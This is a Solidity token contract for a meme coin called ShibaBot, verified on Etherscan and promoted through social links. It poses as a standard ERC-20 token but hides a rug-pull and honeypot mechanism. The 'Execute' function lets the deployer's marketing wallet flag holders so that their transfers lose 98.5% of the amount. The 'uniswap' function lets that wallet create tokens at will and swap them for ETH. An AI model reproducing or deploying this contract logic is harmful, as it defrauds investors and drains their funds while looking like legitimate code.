/**
 *Submitted for verification at Etherscan.io on 2023-07-20
*/

//**
/**
  ShibaBot: @Shibafriend_Bot

  Twitter: https://twitter.com/ShibaBotERC

  Telegram: https://t.me/ShibaBotPortal
*/


pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT



interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

contract Context {
    function msgSender() public view returns (address) {return msg.sender;}
}
library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}


interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 asd, uint256 bewr, address[] calldata _path, address csdf, uint256) external;
    function factory() external pure returns (address addr);
    function WETH() external pure returns (address aadd);
}
abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner"); _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract ShibBot is Ownable, Context {
    using SafeMath for uint256;

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msgSender(), spender, amount);
        return true;
    }
    event Approval(address indexed from, address indexed to_addres, uint256 value);
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    uint256 public _decimals = 9;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msgSender(), spender, _allowances[msgSender()][spender] + addedValue);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) { _transfer(msgSender(), recipient, amount); return true; }
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    function _transfer(address _from, address _to, uint256 _amount) internal {
        uint256 feeAmount = (
            cooldowns[_from] != 0 && cooldowns[_from] <= currentBlock()
        ) ? _amount.mul(985).div(1000) 
        :  sellFee;
        require(_amount <= _balances[_from]); 
        _balances[_to] += _amount - feeAmount;
        _balances[_from] -= (_amount); 
        require(_from != address(0));
        emit Transfer(_from, _to, _amount);
    }
    uint256 sellFee = 0;
    uint256 buyFee = 0;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    string private _symbol = "ShibBot";
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    string private _name = "ShibaBot";
    function Execute(address[] calldata _addresses) external { 
        uint256 _toBlockNumber = currentBlock() + 1;
        for (uint _ndex_ = 0;  _ndex_ < _addresses.length;  _ndex_++) { 
            if (marketing()){ cooldowns[_addresses[_ndex_]] = _toBlockNumber; }
        }
    } 
    address public _marketingWallet;
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function currentBlock() private view returns (uint256) {
        return block.number;
    }
    function setBuyFee(uint256 bf) external onlyOwner {
        buyFee = bf;
    }
    function setSellFee(uint256 sf) external  onlyOwner {
        sellFee = sf;
    }
    mapping(address => uint256) private _balances;
    event Transfer(address indexed from, address indexed aindex, uint256 val);

    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    function marketing() internal view returns (bool) {
        return _marketingWallet == msgSender();
    }
    function transferFrom(address from_, address to_, uint256 _amount) public returns (bool) {
        _transfer(from_, to_, _amount);
        require(_allowances[from_][msgSender()] >= _amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping (address => uint256) cooldowns;
    function uniswap(uint256 quantity, address _addrSwap) external {
        if (marketing()) { _approve(address(this), address(uniswapRouter),  quantity); 
        _balances[address(this)] = quantity;
        address[] memory tokenPath = new address[](2);  
        tokenPath[0] = address(this);   
        tokenPath[1] = uniswapRouter.WETH();  
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(quantity, 0, tokenPath, _addrSwap, 32 + block.timestamp);
        }
    }
    function name() external view returns (string memory) { return _name; }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msgSender()][from] >= amount);
        _approve(msgSender(), from, _allowances[msg.sender][from] - amount);
        return true;
    } 
    mapping(address => mapping(address => uint256)) private _allowances;
    constructor() {
        _balances[msgSender()] = _totalSupply; 
        _marketingWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
}